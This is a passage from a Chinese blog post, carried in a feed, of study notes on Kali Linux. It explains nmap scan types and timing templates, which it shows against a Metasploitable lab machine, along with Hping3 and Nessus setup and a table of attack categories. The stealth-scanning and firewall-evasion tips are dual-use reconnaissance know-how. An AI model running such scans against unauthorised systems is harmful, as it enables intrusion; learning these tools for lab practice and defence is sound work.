nmap -sS-T2 192.168.1.1 -oN</code></p><blockquote><p>-sS 表示以隐蔽的方式扫描<br>-T2 是计时选项，他告诉引擎需要产生多大的流量，以及产生的时间。直接的影响了扫描速度<br>ip 这个就不用说了，目标地址<br>-oN 是输出选项，他告诉程序把扫描结果输出到哪里</p></blockquote><p>简单的，我们在kali下用nmap试探一下搭建好的靶机--Metaploitable</p><p><code># nmap 192.168.230.137</code></p><p>在不设置参数的时候，Nmap会对目标进行一次隐蔽扫描，T3模版，并输出到控制台。</p><p><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fxy8utnyblj30uu0k9wob.jpg" alt=""></p><p>下面分别介绍三个参数的更多命令：</p><p><b>-sS</b><br>发起一次隐蔽扫描，这也是nmap的默认扫描方式。为什么能做到隐秘扫描呢？隐秘扫描时nmap会向目标服务器发送一次TCP的SYN请求，之后服务器对应的回复SYN/ACK后，扫描引擎不会再去确认它。这样就无法构成三次的过程，也就是无法形成TCP通道，大多数系统都会在这之后的一段时间内自动关闭该链接,从而达到隐秘扫描的目的。</p><p><b>-sT</b><br>发起一次TCP连接扫描。这会建立起一个完整的TCP连接，同时也会获取到更多的信息。</p><p><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fxy8vuooanj30pz0g0gsd.jpg" alt=""></p><p><b>-sU</b><br>发起一次UDP扫描。UDP扫描会期望收到已经关闭端口的系统应答，而发送到开放的UDP端口的数据包不会被响应。<br>这个扫描方式的速度非常缓慢。</p><p><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fxy9ucsye8j30jn07j40z.jpg" alt=""></p><p><b>-sA</b><br>发起一次ACK扫描，可以用于TCP端口是否被过滤的检测。这种扫描会对会主机发起一个标记为ACK的通信。这种扫描有时候可以绕过防火墙（伪装成内网的TCP请求）。</p><p><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fxy9v4kcgzj30gd040gmu.jpg" alt=""></p><p><b>-sP</b><br>通过ICMP ping来获取网络中存活主机。</p><p><b>-Pn/-PU</b><br>不采取ICMP,对开放的Udp端口进行存活确认。</p><p><b>-sn</b><br>仅探测存活主机</p><p><b>-p</b><br>选定要扫描的端口号范围。</p><p><b>-O/-A</b><br>识别操系统<br><b>timing模版</b><br>nmap的模版一共有5级：T0-T5,从低到高隐秘性与准确性降低，速度加快。<br>nmap有三个时间参数：scan_delay、max_scan_delay、max_parallelism。</p><p>scan_delay设置了两次探测之间的最小时间差，max_scan_delay根据目标和网络设置调整扫描器允许的扫描器延时的最大值，max_parallelism设置告诉扫描器是串行探测还是并行探测。</p><p><b>-T0 Paranoid</b><br>这个模版被用于慢速的网络连接。或者必须最小化发现风险的环境。<br>扫描类型为串行，扫描时间间隔最少是五分钟，max_scan_delay会被忽略。<br>这个选项智慧早急需隐蔽或是时间充裕下选择。</p><p><b>-T1 Sneaky</b><br>这个模版是基于T0的一些优化。他的速度会比T0块，同时保持了慢速扫描固有的隐蔽性。<br>扫描类型依旧为串行，scan_delay值为15s。</p><p><b>-T2 Polite</b><br>扫描速度继续加快，依旧使用串行方式，scan_delay值为400ms,max_scan_delay为1分钟。</p><p><b>-T3 Normal</b><br>这个模版是nmap默认扫描方式的模版，当我们不设置timing参数时会默认使用这个模版的设置。<br>从T3开始扫描方式切换为并行，scan_delay为0s，max_scan_delay为1s。</p><p><b>-T4 Aggressive</b><br>速度继续增加，scan_delay为0s，max_scan_delay为10ms。在一些响应探针的时间间隔最小为1s的操作系统上很容易出错。</p><p><b>-T5 Insane</b><br>最快的内置模版，并行扫描 + scan_delay为0秒 + max_scan_delay = 5ms。<br>最快可达22s扫描完成，但对于某些主机的操作系统和设置，这个参数可能会导致错误。</p><p><b>IP参数</b><br>对于nmap，IP参数可以是一个固定的地址，或是地址段。<br>地址段支持CIDR寻址方式。<br>同样也可以用一个文件来导入目标地址。</p><p><code># nmap -iL targets.txt</code></p><p><b>-oN 普通输出</b><br>普通输出，创建一个文本文档并写入。</p><p><b>-oX XML输出</b><br>输出格式为XML的文档。</p><p><b>-oG GREPable输出</b><br>适用于GREP工具的文档形式输出。</p><p><b>-oS 脚本式输出</b></p><p><b> --script 脚本引擎</b><br>nmap同时也支持使用脚本引擎进行扫描。<br><a href="http://nmap.org/nsedoc/">更多信息</a></p><h5 id="Hping3">Hping3</h5><p>这是一个可以手动制作数据包并发送到网络的应用程序。<br>更多参数在 -h 选项中可以看到</p><h5 id="Nessus">Nessus</h5><p>这是一个漏洞扫描的应用程序,Kali内未内置，需要自行安装一下。<br>从 <a href="http://www.nessus.org/download">Nessus</a> 下载<br>完成后dpkg安装即可。</p><p>启动Nessus：<br><code># /etc/init.d/nessusd start</code><br>启动成功后，打开本地浏览器：<code>http://localhost:8834/</code> 进入设置页面。</p><p>可以去官网注册一个免费版的帐号，好像需要科学上网。</p><p>验证完成会开始下载。之后进行初始化的设置。</p><p>设置好登录帐号和密码，即可进入控制台。</p><p>关于Nessus的使用，可以列为一篇新的文章了。这里不再过多的描述了。</p><h4 id="font-color-blue-3-渗透-font-br"><font color = "blue">3.渗透</font><br></h4><p>首先要对几个名词性概念进行了解：<br>漏洞：存在于信息系统、系统安全规程、内部控制和实现中，并可能被外部威胁源所利用的弱点。<br>漏洞是由错误产生的，这个错误可以存在于多个地方。<br>渗透就是要利用各种漏洞进行越权访问信息或者造成拒绝服务（DOS）。<br>攻击向量：我的理解是攻击的主要思路，也就是攻击的大方向。<br>攻击类型：每种不同的大方向下会存在各种各样的小类型,也就是具体的攻击手段。</p><table>    <tr>        <td>攻击向量</td>         <td>攻击类型</td>    </tr>    <tr>        <td rowspan="4">Code Injection</td>            <td >缓冲区溢出</td>      </tr>    <tr>        <td >缓冲区欠载（buffer underrun)</td>      </tr>    <tr>        <td >病毒</td>      </tr>    <tr>        <td >恶意软件</td>      </tr>    <tr>        <td rowspan="4">Web Based</td>            <td >篡改</td>      </tr>    <tr>        <td >跨站脚本公积（XSS）</td>      </tr>    <tr>        <td >跨站请求伪造（XSRF）</td>      </tr>    <tr>        <td >SQL注入</td>      </tr>     <tr>        <td rowspan="4">Network Based</td>            <td >拒绝服务攻击（DoS）</td>      </tr>    <tr>        <td >分布式拒绝服务攻击（DDoS）</td>      </tr>    <tr>        <td >密码和敏感数据拦截</td>      </tr>    <tr>        <td >证书盗窃和伪造</td>      </tr>    <tr>        <td rowspan="4">Social Engineering</td>            <td >身份伪造</td>      </tr>    <tr>        <td >网络钓鱼</td>      </tr>    <tr>        <td >鱼叉式网络钓鱼</td>      </tr>    <tr>        <td >情报搜索</td>      </tr></table><p>Kali在渗透这一步主要使用 Metasploit ，单独在另一个文章内陈述。<br>这里只介绍部分Web渗透的工具。</p><h4 id="参考链接">参考链接</h4><blockquote><p>0.官网 : <a href="http://www.kali.org/">http://www.kali.org/</a><br>3.Metasploitable2 官网 : <a href="http://sourceforge.net">http://sourceforge.net</a><br>5.最新参考资源 : <a href="http://sourceforge.net/projects/mutillidate">http://sourceforge.net/projects/mutillidate</a><br>6.参考视频 : <a href="http://www.youtube.com/user/webpwnized">http://www.youtube.com/user/webpwnized</a><br>7.更多信息 : <a href="http://www.webdav.com">http://www.webdav.com</a><br>8.More : <a href="http://github.com/SpiderLabs/MCIR">http://github.com/SpiderLabs/MCIR</a><br>12.Google 的高级搜索页 : <a href="http://www.google.com/advanced_search">http://www.google.com/advanced_search</a><br>13.Google Hacking 数据库 : GHDB]<br>14.阅读《Google Hacking for Penetration Testers》 : <a href="http://www.offensive-security.com/community-projects/google-hacking-database/">http://www.offensive-security.com/community-projects/google-hacking-database/</a><br>19.更多信息 : <a href="http://nmap.org/nsedoc/">http://nmap.org/nsedoc/</a><br>20.Nessus : <a href="http://www.nessus.org/download">http://www.nessus.org/download</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Linux--KaLi&lt;/h1&gt;
&lt;h3 id=&quot;b-0x00-前言-b&quot;&gt;&lt;b&gt;0x00- - 前言&lt;b&gt;&lt;/h3&gt;
&lt;p&gt;咳咳,一直想要把KaLi里面的东西好好的整理一下，毕竟能省去很多复杂的操作时间。（其实就是图书馆借的书马上得换了赶紧翻两页写个笔记好了Orz...</summary>
      
    
    
    
    <category term="Operation" scheme="http://blog.dvkunion.cn/categories/Operation/"/>
    
    
    <category term="操作系统" scheme="http://blog.dvkunion.cn/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Linux" scheme="http://blog.dvkunion.cn/tags/Linux/"/>
    
  </entry>
  
</feed>
